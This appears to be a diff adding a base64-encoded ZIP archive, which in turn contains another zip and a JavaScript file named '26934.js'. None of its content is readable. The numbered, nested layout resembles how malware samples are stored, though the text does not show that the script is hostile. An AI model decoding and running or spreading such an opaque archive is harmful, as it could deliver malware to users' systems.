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
